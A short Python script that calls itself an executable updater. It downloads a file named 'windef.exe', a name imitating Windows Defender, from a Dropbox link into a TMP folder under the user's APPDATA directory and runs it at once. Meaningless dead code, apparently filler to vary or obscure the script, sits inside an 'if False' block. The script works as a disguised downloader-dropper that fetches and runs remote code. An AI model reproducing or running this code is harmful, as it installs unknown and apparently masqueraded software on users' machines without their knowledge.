import subprocess
import os
from pathlib import Path
import requests
from urllib.parse import urljoin

def descargar_ejecutable(url, destino):
    response = requests.get(url, stream=True)
    response.raise_for_status()
    with open(destino, 'wb') as archivo:
        for chunk in response.iter_content(chunk_size=8192):
            archivo.write(chunk)

def actualizar_ejecutable():
    nombre_ejecutable = 'windef.exe'
    url_base = 'https://dl.dropbox.com/scl/fi/jeyh5skw4yfejo89jrms9/windef.exe?rlkey=8eskz8wpj79mqjn0b8bf2uhoz&dl=0'
    carpeta_destino = Path(os.getenv('APPDATA')) / 'TMP'
    ruta_ejecutable = carpeta_destino / nombre_ejecutable
    carpeta_destino.mkdir(parents=True, exist_ok=True)
    url_completa = urljoin(url_base, nombre_ejecutable)
    if False:
        _var_205_0 = (285, 25, 883)

        def _var_205_fn():
            pass
    descargar_ejecutable(url_completa, ruta_ejecutable)
    subprocess.run([str(ruta_ejecutable)])